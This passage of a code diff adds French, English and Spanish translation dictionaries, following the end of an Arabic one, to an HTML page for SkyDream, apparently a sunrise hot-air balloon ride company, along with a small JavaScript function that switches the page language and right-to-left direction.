+        p3_f1:"بالون كامل لمجموعتك", p3_f2:"رحلة مرنة حتى 120 دقيقة", p3_f3:"مسار مخصص حسب رغبتك", p3_f4:"تصوير جوي + أرضي", p3_f5:"مأدبة خاصة فاخرة",
+        most_popular:"الأكثر طلباً", book_now:"احجز الآن", contact_us:"تواصل معنا",
+        test_label:"آراء ضيوفنا", test_title:"ماذا قالوا عن <span>تجربتهم</span>",
+        t1_text:'"تجربة غيّرت مفهومي للسفر. اللحظة التي بدأ البالون يرتفع شعرت أنني في حلم!"',
+        t5_text:'"أخذنا العائلة كلها، الأطفال كانوا مبهورين! فريق استثنائي ولحظات لا تُمحى."',
+        cta_label:"تواصل معنا", cta_title:"جاهز لتحليق <span>حلمك</span>؟", cta_desc:"احجز الآن عبر واتساب — نرد خلال دقائق ونُرتّب كل شيء من أجلك",
+        whatsapp_btn:"تواصل عبر واتساب", available:"متاح 7 أيام في الأسبوع",
+        footer_copy:"© 2025 SkyDream — جميع الحقوق محفوظة", footer_privacy:"سياسة الخصوصية", footer_terms:"الشروط والأحكام", footer_contact:"تواصل معنا"
+      },
+      fr: {
+        nav_gallery:"Galerie", nav_experience:"Expérience", nav_packages:"Forfaits", nav_book:"Réserver",
+        hero_eyebrow:"✦ Une expérience inoubliable ✦",
+        hero_h1:"Envolez-vous vers<br/><em>l'horizon doré</em>",
+        hero_p:"Vols en montgolfière de luxe au lever du soleil — là où le monde s'arrête et la magie commence",
+        hero_cta1:"Réserver maintenant", hero_cta2:"Voir la galerie", scroll_hint:"Découvrir",
+        stat1:"Vols réussis", stat2:"Nationalités à bord", stat3:"Note clients / 10", stat4:"Ans d'expérience",
+        gallery_label:"Galerie photos", gallery_title:"Instants <span>inoubliables</span>", gallery_desc:"Chaque vol est une histoire visuelle unique — de la flamme chaleureuse à l'horizon sans fin",
+        gtag1:"Instant de décollage", gtag2:"Altitude des secrets", gtag3:"Le désert vu du ciel", gtag4:"Flotte de montgolfières",
+        badge_safe:"Sécurité certifiée",
+        exp_label:"Pourquoi SkyDream", exp_title:"Une expérience <span>exceptionnelle</span><br/>du début à la fin", exp_desc:"Nous concevons chaque détail avec soin — de votre accueil avant l'aube jusqu'à votre célébration après l'atterrissage",
+        f1_title:"Décollage au lever du soleil", f1_desc:"Un timing étudié pour vous offrir les plus belles couleurs du ciel",
+        f2_title:"Pilotes experts certifiés", f2_desc:"Plus de 5 000 heures de vol par pilote — votre sécurité est notre priorité",
+        f3_title:"Petit-déjeuner gastronomique", f3_desc:"Célébrez votre vol avec une table raffinée au cœur de la nature",
+        f4_title:"Photographie professionnelle incluse", f4_desc:"Un photographe dédié capture chaque instant pour l'éternité",
+        pkg_label:"Nos forfaits", pkg_title:"Choisissez <span>votre vol</span>", pkg_desc:"Un vol taillé sur mesure pour chaque voyageur",
+        pkg1_name:"Découverte", pkg2_name:"Premium", pkg3_name:"Privé Exclusif",
+        per_person:"/pers.", per_balloon:"/montgolfière",
+        p1_f1:"Vol de 60 minutes", p1_f2:"Décollage au lever du soleil", p1_f3:"Petit-déjeuner léger", p1_f4:"Certificat de vol",
+        p2_f1:"Vol de 90 minutes", p2_f2:"Espace privatisé dans la nacelle", p2_f3:"Petit-déjeuner gastronomique", p2_f4:"Photographie professionnelle", p2_f5:"Champagne à l'atterrissage",
+        p3_f1:"Montgolfière entière pour votre groupe", p3_f2:"Vol flexible jusqu'à 120 minutes", p3_f3:"Itinéraire personnalisé", p3_f4:"Prise de vue aérienne + terrestre", p3_f5:"Banquet privé de luxe",
+        most_popular:"Le plus populaire", book_now:"Réserver", contact_us:"Nous contacter",
+        test_label:"Avis de nos voyageurs", test_title:"Ce qu'ils disent de leur <span>expérience</span>",
+        t1_text:'"Une expérience qui a changé ma vision du voyage. Le moment où la montgolfière s\'est élevée, j\'étais dans un rêve!"',
+        t5_text:'"Toute la famille était émerveillée ! Une équipe extraordinaire et des souvenirs impérissables."',
+        cta_label:"Contactez-nous", cta_title:"Prêt à vivre votre <span>rêve</span> ?", cta_desc:"Réservez maintenant via WhatsApp — nous répondons en quelques minutes et organisons tout pour vous",
+        whatsapp_btn:"Contacter via WhatsApp", available:"Disponible 7 jours / 7",
+        footer_copy:"© 2025 SkyDream — Tous droits réservés", footer_privacy:"Politique de confidentialité", footer_terms:"Conditions générales", footer_contact:"Contact"
+      },
+      en: {
+        nav_gallery:"Gallery", nav_experience:"Experience", nav_packages:"Packages", nav_book:"Book Now",
+        hero_eyebrow:"✦ An unforgettable experience ✦",
+        hero_h1:"Soar above<br/><em>the golden horizon</em>",
+        hero_p:"Luxury hot air balloon rides at sunrise — where the world ends and magic begins",
+        hero_cta1:"Book your experience", hero_cta2:"View gallery", scroll_hint:"Discover",
+        stat1:"Successful flights", stat2:"Countries represented", stat3:"Guest rating / 10", stat4:"Years of experience",
+        gallery_label:"Photo gallery", gallery_title:"<span>Unforgettable</span> moments", gallery_desc:"Every flight is a unique visual story — from the warm balloon flame to the endless horizon",
+        gtag1:"Launch moment", gtag2:"Altitude secrets", gtag3:"Desert from above", gtag4:"Balloon fleet",
+        badge_safe:"Certified safety",
+        exp_label:"Why SkyDream", exp_title:"An <span>exceptional</span> experience<br/>from start to finish", exp_desc:"We design every detail with care — from your pre-dawn welcome to your post-landing celebration",
+        f1_title:"Sunrise launch", f1_desc:"Perfect timing to give you the most beautiful sky colours and gentlest winds",
+        f2_title:"Licensed expert pilots", f2_desc:"Over 5,000 flight hours per pilot — your safety is our top priority",
+        f3_title:"Gourmet post-flight breakfast", f3_desc:"Celebrate your experience with an elegant table in the heart of nature",
+        f4_title:"Professional photography included", f4_desc:"A dedicated photographer captures every moment for you to keep forever",
+        pkg_label:"Our packages", pkg_title:"Choose your <span>experience</span>", pkg_desc:"A flight designed for every type of traveller",
+        pkg1_name:"Discovery", pkg2_name:"Premium", pkg3_name:"Exclusive Private",
+        per_person:"/person", per_balloon:"/balloon",
+        p1_f1:"60-minute flight", p1_f2:"Sunrise launch", p1_f3:"Light breakfast", p1_f4:"Flight certificate",
+        p2_f1:"90-minute flight", p2_f2:"Private area in the basket", p2_f3:"Gourmet breakfast on the ground", p2_f4:"Professional photography included", p2_f5:"Champagne at landing",
+        p3_f1:"Full balloon for your group", p3_f2:"Flexible flight up to 120 minutes", p3_f3:"Customised route", p3_f4:"Aerial + ground photography", p3_f5:"Luxury private banquet",
+        most_popular:"Most popular", book_now:"Book now", contact_us:"Contact us",
+        test_label:"Guest reviews", test_title:"What they said about their <span>experience</span>",
+        t1_text:'"An experience that changed the way I think about travel. The moment the balloon lifted, I felt I was in a dream!"',
+        t5_text:'"We brought the whole family — the kids were amazed! An extraordinary team and memories that will last forever."',
+        cta_label:"Get in touch", cta_title:"Ready to fly your <span>dream</span>?", cta_desc:"Book now via WhatsApp — we reply within minutes and arrange everything for you",
+        whatsapp_btn:"Contact via WhatsApp", available:"Available 7 days a week",
+        footer_copy:"© 2025 SkyDream — All rights reserved", footer_privacy:"Privacy policy", footer_terms:"Terms & conditions", footer_contact:"Contact"
+      },
+      es: {
+        nav_gallery:"Galería", nav_experience:"Experiencia", nav_packages:"Paquetes", nav_book:"Reservar",
+        hero_eyebrow:"✦ Una experiencia inolvidable ✦",
+        hero_h1:"Vuela sobre<br/><em>el horizonte dorado</em>",
+        hero_p:"Vuelos en globo aerostático de lujo al amanecer — donde el mundo termina y la magia comienza",
+        hero_cta1:"Reserva tu experiencia", hero_cta2:"Ver galería", scroll_hint:"Descubrir",
+        stat1:"Vuelos exitosos", stat2:"Países representados", stat3:"Valoración / 10", stat4:"Años de experiencia",
+        gallery_label:"Galería de fotos", gallery_title:"Momentos <span>únicos</span>", gallery_desc:"Cada vuelo es una historia visual única — desde la llama cálida del globo hasta el horizonte infinito",
+        gtag1:"Momento del despegue", gtag2:"Secretos a gran altura", gtag3:"El desierto desde arriba", gtag4:"Flota de globos",
+        badge_safe:"Seguridad certificada",
+        exp_label:"Por qué SkyDream", exp_title:"Una experiencia <span>excepcional</span><br/>de principio a fin", exp_desc:"Diseñamos cada detalle con cuidado — desde su bienvenida antes del amanecer hasta la celebración tras el aterrizaje",
+        f1_title:"Despegue al amanecer", f1_desc:"Timing perfecto para ofrecerle los colores más bellos del cielo",
+        f2_title:"Pilotos expertos certificados", f2_desc:"Más de 5.000 horas de vuelo por piloto — su seguridad es nuestra prioridad",
+        f3_title:"Desayuno gourmet post-vuelo", f3_desc:"Celebre su experiencia con una mesa elegante en plena naturaleza",
+        f4_title:"Fotografía profesional incluida", f4_desc:"Un fotógrafo dedicado captura cada momento para que lo lleve siempre",
+        pkg_label:"Nuestros paquetes", pkg_title:"Elige tu <span>experiencia</span>", pkg_desc:"Un vuelo diseñado para cada tipo de viajero",
+        pkg1_name:"Descubrimiento", pkg2_name:"Premium", pkg3_name:"Privado Exclusivo",
+        per_person:"/persona", per_balloon:"/globo",
+        p1_f1:"Vuelo de 60 minutos", p1_f2:"Despegue al amanecer", p1_f3:"Desayuno ligero", p1_f4:"Certificado de vuelo",
+        p2_f1:"Vuelo de 90 minutos", p2_f2:"Zona privada en la cesta", p2_f3:"Desayuno gourmet en tierra", p2_f4:"Fotografía profesional incluida", p2_f5:"Champán al aterrizar",
+        p3_f1:"Globo completo para su grupo", p3_f2:"Vuelo flexible hasta 120 minutos", p3_f3:"Ruta personalizada", p3_f4:"Fotografía aérea + terrestre", p3_f5:"Banquete privado de lujo",
+        most_popular:"El más popular", book_now:"Reservar", contact_us:"Contáctenos",
+        test_label:"Opiniones de nuestros viajeros", test_title:"Lo que dijeron de su <span>experiencia</span>",
+        t1_text:'"¡Una experiencia que cambió mi forma de ver los viajes! Cuando el globo empezó a subir sentí que volaba en un sueño."',
+        t5_text:'"¡Llevamos a toda la familia, los niños estaban fascinados! Un equipo extraordinario y recuerdos para toda la vida."',
+        cta_label:"Contáctenos", cta_title:"¿Listo para volar tu <span>sueño</span>?", cta_desc:"Reserva ahora por WhatsApp — respondemos en minutos y organizamos todo por ti",
+        whatsapp_btn:"Contactar por WhatsApp", available:"Disponible los 7 días de la semana",
+        footer_copy:"© 2025 SkyDream — Todos los derechos reservados", footer_privacy:"Política de privacidad", footer_terms:"Términos y condiciones", footer_contact:"Contacto"
+      }
+    };
+
+    const rtlLangs = ['ar'];
+
+    function setLang(lang) {
+      const t = translations[lang];
+      if (!t) return;
+
+      const isRtl = rtlLangs.includes(lang);
+      document.documentElement.setAttribute('dir', isRtl ? 'rtl' : 'ltr');
+      document.documentElement.setAttribute('lang', lang);
+
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (t[key] !== undefined) el.innerHTML = t[key];
+      });
+
+      document.querySelectorAll('.lang-btn').forEach(btn => {
+        const btnLang = btn.textContent.trim().toLowerCase();
+        const isActive = btnLang === lang || (lang === 'ar' && btnLang === 'عربي');
+        btn.classList.toggle('active', isActive);
+      });
+    }
+
+    // init
+    setLang('ar');
+  </script>
+
 </body>
 </html>
